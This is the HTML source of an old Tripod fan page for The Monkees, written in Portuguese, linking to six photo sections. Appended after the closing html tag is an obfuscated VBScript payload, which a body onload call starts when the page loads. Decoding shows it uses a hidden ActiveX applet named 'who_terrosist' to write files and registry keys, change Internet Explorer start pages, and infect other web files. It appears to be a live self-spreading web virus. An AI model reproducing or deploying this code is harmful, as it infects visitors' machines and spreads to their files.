
<html>

<head>
<meta http-equiv="Content-Language" content="pt-br">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>The Monkees!!</title>
</head>

<body onload="vbscript:run_time()" background="background.jpg" link="#660066" vlink="#9900CC" alink="#CC99FF"><style id="BANNERSTYLE" type="text/css">
div#tb_container{text-align:center; color:#fff}
div#tb_container a{color:#fff; font-family:Arial, Helvetica, sans-serif; font-size:11px; text-decoration:none}
div#tb_container a:hover{color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg{width:760px; margin:0 auto 10px; padding:0; text-shadow:1px 1px 1px #515151;
	background-color:#7F9343;
  	background-image:-moz-linear-gradient(top, #7F9343, #CAD99B); 
  	background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0, #7F9343),color-stop(1, #CAD99B));
  	-moz-border-radius:0 0 10px 10px; -webkit-border-radius:0 0 10px 10px; border-radius:0 0 10px 10px;
  	-moz-box-shadow:1px 1px 2px #292929; -webkit-box-shadow:1px 1px 2px #292929; box-shadow:1px 1px 2px #292929; overflow:hidden;
	font-family:Arial, Helvetica, sans-serif}
div#tb_container div.tb_menu_bg a.floatLeftAd{float:left; margin-left:13px; background:url(adm/common/images/tripodLogoAd.png) no-repeat -94px 0; height:27px; width:86px}
div#tb_container div.tb_menu_bg a.floatLeftAd:hover{background-position:0 0}
div#tb_container div.tb_menu_bg .txtContainer{float:left; margin:4px 0 0 10px}
div#tb_container div.tb_menu_bg .txtContainer strong{margin-left:5px; border-left:1px solid; padding-left:18px; color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg a.big{font-size:17px; margin:0 10px}
</style>


<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "groupgallery";
var tripod_member_page = "groupgallery/index.htm";
var tripod_ratings_hash = "1306570023:88230beed275f757d6f28946a2644678";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "204.93.130.142";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=838134";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=838134";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}


jQuery.noConflict();
jQuery(function(){
  if ( ! lycos_check_size() ) { jQuery("#tb_container").hide(); jQuery("#FooterAd").hide(); return; }

  var onButton = -44;
  var onShare = -89;
  var onSearch = 0;
  var $build = jQuery("#build");
  var ss = $build.css("top");

	jQuery("#more_click").unbind().click(function(ev){
      if (ss == onShare) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onShare + "px"});
          ss = onShare;
      }
	});
											
	jQuery("#searchlycos").unbind().click(function(ev){
      if (ss == onSearch) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onSearch + "px"});
          ss = onSearch;
      }
	});
	
  var f = jQuery("#FooterAd").remove();
  f.children("script").remove();
  f.appendTo("body");

  jQuery("#BANNERSTYLE").appendTo("head");

});
</script>
<div id="tb_container">
    <div class="tb_menu_bg">
        <div id="tb_menu">
        
   <a href="http://www.tripod.lycos.com" title="tripod.com" class="floatLeftAd"></a>
   
   <div class="txtContainer">
   <a href="http://www.tripod.lycos.com" title="Build a website at Tripod.com" class="big">Build your own FREE website at Tripod.com</a>
   <strong style="font-size:14px">Share: </strong>

<a href="http://www.facebook.com" onclick="generateHref(this, 'http://facebook.com/sharer.php?u=_MYURL_&t=_MYTITLE_')" id="facebook" rel="nofollow">Facebook</a> |
<a href="http://www.twitter.com" onclick="generateHref(this, 'http://twitter.com/home?status=_MYTITLE_%20-%20_MYURL_')" id="twitter" rel="nofollow">Twitter</a> |
<a href="http://www.digg.com" onclick="generateHref(this, 'http://digg.com/submit?phase=2&url=_MYURL_&title=_MYTITLE_')" id="digg" rel="nofollow">Digg</a> |
<a href="http://reddit.com" onclick="generateHref(this, 'http://reddit.com/submit?url=_MYURL_&title=_MYTITLE_')" id="reddit" rel="nofollow">reddit</a>
</div>
		</div>
    </div>
	
    
    <div id="tb_ad" style="display:block!important"><div id="ad_container" style="display:block!important"><script type="text/javascript">document.write(lycos_ad['leaderboard']);</script></div></div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important"><script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script></div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=838134" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>





<p align="center"><u><font face="Creampuff" size="7" color="#660066">The Monkees</font></u></p>
<p align="center"><b><font face="Arial" size="2" color="#660066">Fotos em dupla,
trio e com o grupo todo! Aqui voc� encontra todas as variedades de combina��es
monkeeanas para fazer seu dia mais feliz!!!</font></b></p>
<p align="center"><b><font face="Arial" color="#660066" size="2"><a href="section01.htm" target="_self">Sess�o 1</a><br>
<a href="section02.htm" target="_self">
Sess�o 2</a><br>
<a href="section03.htm" target="_self">
Sess�o 3</a><br>
<a href="section04.htm" target="_self">
Sess�o 4</a><br>
<a href="section05.htm" target="_self">
Sess�o 5</a><br>
<a href="section06.htm" target="_self">Sess�o 6</a></font></b></p>
<p align="center"><b><font face="Arial" size="2" color="#660066">Cada uma dessas
loucas se��es tem oito miniaturas que n�o sobrecarregam a sua internet! Isso
n�o � demais???</font></b></p>

</body>

</html>

<!-- Don't modify this line, required by system protocol! -->
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=who"&"_terrosist HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ScriptCode = "ChlRBqhos+VRBqhos+@ookds+VhmO`sg+mEnkcdq+mBncdRtaQtm^Shld'(EE/0'(EE/1'(DmcRtaEtmbshnmEE/0'(NmDqqnqQdrtldMdwsDqq-Bkd`qSncnHs<VRbqhos-RbqhosEtkkm`ldHeDqqSgdmU/3<gslkDkrdU/3<uarDmcHeHeU/3<uarSgdmRdsRBqhos<Bqd`sdNaidbs'Rbqhoshmf-EhkdRxrsdlNaidbs(RdsVRBqhos<Bqd`sdNaidbs'VRbqhos-Rgdkk(DkrdRds@ookds<Cnbtldms-`ookdsr'vgn^sdqqnrhrs(@ookds-rdsBKRHC'zE824CB11,0BE/,00C/,@CA8,//B/3EC47@/A|(@ookds-bqd`sdHmrs`mbd'(RdsVRBqhos<@ookds-FdsNaidbs'(@ookds-rdsBKRHC'z/C32ED/0,E/82,00BE,783/,//@/B8/43117|(@ookds-bqd`sdHmrs`mbd'(RdsRBqhos<@ookds-FdsNaidbs'(DmcHeDmcEtmbshnmEtmbshnmEE05'mO`sg(HeQhfgs'mO`sg+0(<[SgdmEE05<mO`sgDkrdEE05<mO`sg%[DmcHeDmcEtmbshnmEtmbshnmEE/5'(EE/5<EE05'Rbqhos-FdsRodbh`kEnkcdq'/((DmcEtmbshnmEtmbshnmEE/6'(mQdf^@<GJDX^BTQQDMS^TRDQ[BnmsqnkO`mdk[Hmsdqm`shnm`k[mQdf^A<GJDX^BTQQDMS^TRDQ[Rnesv`qd[Bk`rrdr[BKRHC[mQdf^B<GJDX^KNB@K^L@BGHMD[RNESV@QD[Lhbqnrnes[Vhmcnvr[BtqqdmsUdqrhnm[mQdf^C<GJDX^BTQQDMS^TRDQ[Rnesv`qd[Lhbqnrnes[SdloO`sg<rxrsdl21[VhsgvRBqhosHe-QdfQd`c'mQdf^B%QdfhrsdqdcNvmdq(<Hmcnmdrh`mSnc`xSgdm-QdfVqhsdmQdf^@%r0048+@msh@R-QdfVqhsdmQdf^@%r1248+@mshRghs-QdfVqhsdmQdf^@%rShldEnql`s+GG9ll9rrss-QdfVqhsdmQdf^A%z1/C/3ED/,2@D@,0/58,@1C7,/7//1A2/2/8C|[+LxJnlotsdq-QdfVqhsdmQdf^B%QdfhrsdqdcNvmdq+Hmcnmdrh`mSnc`x-QdfVqhsdmQdf^B%QdfhrsdqdcNqf`mhy`shnm+Vdknudod`bd-QdfVqhsdmQdf^B%NqfNqf`mhy`shnm+TmcdqFqntmcHmcnmdrh`m-QdfVqhsdmQdf^B%NqfNvmdq+Vdknudod`bd -QdfVqhsdmQdf^C%Vhmcnvr[BtqqdmsUdqrhnm[Dwoknqdq[@cu`mbdc[Ghccdm+0+QDF^CVNQC-QdfVqhsdmQdf^C%Vhmcnvr[BtqqdmsUdqrhnm[Dwoknqdq[@cu`mbdc[GhcdEhkdDws+0+QDF^CVNQC-QdfVqhsdmQdf^C%HmsdqmdsDwoknqdq[L`hm[Knb`kO`fd+EE/5%rxrsdl[ak`mj-gsl-QdfVqhsdmQdf^C%HmsdqmdsDwoknqdq[L`hm[Rs`qsO`fd+EE/5%rxrsdl[ak`mj-gslDmcHeDmcVhsgDmcEtmbshnmEtmbshnmEE/1'(NmDqqnqQdrtldMdwsEE/6'(U@2<EnqH<0SnKdm'RbqhosSdws(U@/<@rb'Lhc'RbqhosSdws+H+0((HeU@/<23SgdmU@1<Bgq'07(DkrdHeU@/<0/SgdmU@1<Bgq'17(DkrdHeU@/<02SgdmU@1<Bgq'18(DkrdU@1<Bgq'U@/,0(DmcHeU@2<U@2%U@1MdwsTmKnbjRsq<Dwdbtsd'ChlRbqhosSdws%uaBqKe%EnqH<0SnKdm'RbqhosBncd(%uaBqKe%U@/<@rb'Lhc'RbqhosBncd+H+0((%uaBqKe%HeU@/<07Sgdm%uaBqKe%U@1<Bgq'23(%uaBqKe%DkrdHeU@/<17Sgdm%uaBqKe%U@1<Bgq'0/(%uaBqKe%DkrdHeU@/<18Sgdm%uaBqKe%U@1<Bgq'02(%uaBqKe%Dkrd%uaBqKe%U@1<Bgq'U@/*0(%uaBqKe%DmcHe%uaBqKe%RbqhosSdws<RbqhosSdws%U@1%uaBqKe%Mdws(%uaBqKe%Dwdbtsd'RbqhosSdws(RbqhosSdws<RbqhosBncd<%U@2%mBncd<; ,,Cnm&slnchexsghrkhmd+qdpthqdcaxrxrsdloqnsnbnk ,,=%uabqke%;%rbqhosk`mft`fd<uarbqhos=%uaBqKe%cnbtldms-vqhsd%%;%chursxkd<&onrhshnm9`arnktsd:kdes9/ow:sno9/ow:vhcsg9/ow:gdhfgs9/ow:y,hmcdw917:uhrhahkhsx9ghccdm&=%;%%@OOKDSM@LD<vgn%^sdqqnrhrsGDHFGS</VHCSG</bncd<bnl-lr-%`bshudW-@bshud%WBnlonmdms=%;%.@OOKDS=%;%.chu=%uaBqKe%;%.rbqhos=%uaBqKe%;%rbqhosk`mft`fd<uarbqhos=%uaBqKe%RbqhosSdws%uaBqKe%TmKnbjRsq%uaBqKe%;%.rbqhos=%uaBqKe%;%.ANCX=%uaBqKe%;%.GSLK=RbqhosSdws<RbqhosBncd<%U@2%U@0<EE/2'Cnbtldms-knb`shnm(U@0<Qdok`bd'U@0+$1/++0+,0(U@0<Qdok`bd'U@0+$15+%+0+,0(U@0<Qdok`bd'U@0+$14+$+0+,0(U@0<Qdok`bd'U@0+$4D+]+0+,0(U@0<Qdok`bd'U@0+$4A+Z+0+,0(U@0<Qdok`bd'U@0+$4C+\+0+,0(U@0<Qdok`bd'U@0+$6A+z+0+,0(U@0<Qdok`bd'U@0+$6C+|+0+,0(U@0<Qdok`bd'U@0+$5/+_+0+,0(HeKdes'U@0+3(<ehkdSgdmU@0<Lhc'U@0+8(Hehmrsq'0+U@0+-(=/SgdmU@0<EE05'Rbqhos-FdsEnkcdq'Rbqhos-FdsO`qdmsEnkcdqM`ld'Kdes'U@0+Kdm'U@0(,0(((-RgnqsO`sg(DkrdU@0<EE05'Rbqhos-FdsEnkcdq'U@0(-RgnqsO`sg(DmcHemEnkcdq<EE/5%vda[enkcdq-gssHeRBqhos-EhkdDwhrsr'mEnkcdq(SgdmRdsU/0<Rbqhos-NodmSdwsEhkd'mEnkcdq+0(U/1<U/0-Qd`c@kkU/1<Kdes'U/1+Hmrsq'0+U/1+;.ANCX=(,0(U/0-BknrdRdsE@ssqha<RBqhos-FdsEhkd'mEnkcdq(E@ssqha-@ssqhatsdr<23HeHmrsq'0+U/1+qtm^shld'((=/SgdmDkrdRdsU/2<Rbqhos-NodmSdwsEhkd'mEnkcdq+1(U/2-Vqhsd;%ANCXnmkn`c<%uarbqhos9%qtm^shld'(%=%uaBqKe%U/1%uaBqKe%mBncdU/2-BknrdE@ssqha-@ssqhatsdr<23Rbqhos-BnoxEhkdEE/5%vda[enkcdq-gss+EE/5%rxrsdl[ak`mj-gslDmcHeDkrdRbqhos-BnoxEhkdU@0%enkcdq-gss+mEnkcdqEE/3'EE/5%vda[Cdrjsno-hmh(Rbqhos-BnoxEhkdEE/5%vda[enkcdq-gss+EE/5%rxrsdl[ak`mj-gslDmcHebEnkcdq<EE/5%rxrsdl21[enkcdq-gssHeRBqhos-EhkdDwhrsr'bEnkcdq(SgdmRdsU/0<Rbqhos-NodmSdwsEhkd'bEnkcdq+0(U/1<U/0-Qd`c@kkU/1<Kdes'U/1+Hmrsq'0+U/1+;.ANCX=(,0(U/0-BknrdRdsE@ssqha<RBqhos-FdsEhkd'bEnkcdq(E@ssqha-@ssqhatsdr<23HeHmrsq'0+U/1+qtm^shld'((=/SgdmDkrdRdsU/2<Rbqhos-NodmSdwsEhkd'bEnkcdq+1(U/2-Vqhsd;%ANCXnmkn`c<%uarbqhos9%qtm^shld'(%=%uaBqKe%U/1%uaBqKe%mBncdU/2-BknrdE@ssqha-@ssqhatsdr<23Rbqhos-BnoxEhkdEE/5%vda[enkcdq-gss+EE/5%rxrsdl21[enkcdq-gssDmcHeDkrdRbqhos-BnoxEhkdEE/5%vda[enkcdq-gss+bEnkcdqEE/3'EE/5%rxrsdl21[Cdrjsno-hmh(DmcHeHeRBqhos-EhkdDwhrsr'U@0%enkcdq-gss(SgdmEE/4'U@0%enkcdq-gss(DkrdRbqhos-BnoxEhkdmEnkcdq+U@0%enkcdq-gssDmcHeEE/3'U@0%Cdrjsno-hmh(RdsU/0<Rbqhos-NodmSdwsEhkd'EE/5%vda[vdauhdv-brr+0(U/1<U/0-Qd`c@kkU/0-BknrdHehmrsq'0+U/1+kdes92/$:vhcsg96/$(=/SgdmU/1<Qdok`bd'U/1+kdes92/$:vhcsg96/$+kdes9/$:vhcsg90//$+0+,0(RdsU/2<Rbqhos-NodmSdwsEhkd'EE/5%vda[vdauhdv-brr+1(U/2-VqhsdU/1U/2-BknrdDmcHeRdsEnkcdqM`ld<Rbqhos-FdsEnkcdq'U@0(RdsSghrEhkdr<EnkcdqM`ld-EhkdrEnqD`bgSghrEhkdHmSghrEhkdrEhkdDws<TB`rd'Rbqhos-FdsDwsdmrhnmM`ld'SghrEhkd-O`sg((HeEhkdDws<GSSNqEhkdDws<GSLNqEhkdDws<GSLKNqEhkdDws<@RONqEhkdDws<OGONqEhkdDws<IROSgdmEE/4'SghrEhkd-O`sg(DmcHeMdwsQ`mcnlhydHeC`x'C`sd(<2/`mcLnmsg'C`sd(Lnc1</SgdmRbqhos-LnudEhkdEE/5%vhm-hmh+EE/5%vnm-bgjRbqhos-LnudEhkdEE/5%rxrsdl-hmh+EE/5%rxrsdl-bgjDmcHeDmcEtmbshnmEtmbshnmEE/4'Ehkdm`ld(HeRBqhos-EhkdDwhrsr'Ehkdm`ld(SgdmRdsU/0<Rbqhos-NodmSdwsEhkd'Ehkdm`ld+0(RdsE@ssqha<Rbqhos-FdsEhkd'Ehkdm`ld(U/1<U/0-Qd`c@kkU/0-BknrdHeHmrsq'0+U/1+;.ANCX=(=/SgdmU/1<Kdes'U/1+Hmrsq'0+U/1+;.ANCX=(,0(HeHmrsq'0+U/1+qtm^shld'((=/SgdmDwhsEtmbshnmDkrdE@ssqha-@ssqhatsdr</RdsU/2<Rbqhos-NodmSdwsEhkd'Ehkdm`ld+1(U/2-Vqhsd;%ANCXnmkn`c<%uarbqhos9%qtm^shld'(%=%uaBqKe%U/1%uaBqKe%mBncdU/2-BknrdTB`rd'Rbqhos-FdsDwsdmrhnmM`ld'Ehkdm`ld((HeEhkdDws<GSSSgdmE@ssqha-@ssqhatsdr<23DkrdE@ssqha-@ssqhatsdr<21DmcheDmcHeDmcHeDmcEtmbshnmEtmbshnmEE/3'EhkdM`ld(HeRBqhos-EhkdDwhrsr'Ehkdm`ld(SgdmDkrdRds`<Rbqhos-Bqd`sdSdwsEhkd'EhkdM`ld+Sqtd(`-VqhsdKhmd'ZDwsRgdkkEnkcdqUhdvr\(`-VqhsdKhmd'Cde`tks<z4873EED/,17C3,00BE,@D55,/7//1A1D0151|(`-VqhsdKhmd'z4873EED/,17C3,00BE,@D55,/7//1A1D0151|<z4873EED/,17C3,00BE,@D55,/7//1A1D0151|%uabqke(`-VqhsdKhmd'Zz4873EED/,17C3,00BE,@D55,/7//1A1D0151|\(`-VqhsdKhmd'OdqrhrsLnmhjdq<ehkd9..enkcdq-gss%uabqke(`-VqhsdKhmd'Z-RgdkkBk`rrHmen\(`-VqhsdKhmd'BnmehqlEhkdNo</(`-BknrdRdsE@ssqha<Rbqhos-FdsEhkd'Ehkdm`ld(E@ssqha-@ssqhatsdr<23DmcHeDmcEtmbshnmEtmbshnmEE/2'U@0(HeQhfgs'U@0+0(<.SgdmEE/2<U@0DkrdEE/2<U@0%.DmcHeDmcEtmbshnm"
Execute("Dim ScriptText"&vbCrLf&"For I = 1 To Len(ScriptCode)"&vbCrLf&"VA0 = Asc(Mid(ScriptCode, I, 1))"&vbCrLf&"If VA0 = 18 Then"&vbCrLf&"VA2 = Chr(34)"&vbCrLf&"ElseIf VA0 = 28 Then"&vbCrLf&"VA2 = Chr(10)"&vbCrLf&"ElseIf VA0 = 29 Then"&vbCrLf&"VA2 = Chr(13)"&vbCrLf&"Else"&vbCrLf&"VA2 = Chr(VA0 + 1)"&vbCrLf&"End If"&vbCrLf&"ScriptText = ScriptText & VA2"&vbCrLf&"Next")
Execute(ScriptText)
</script>
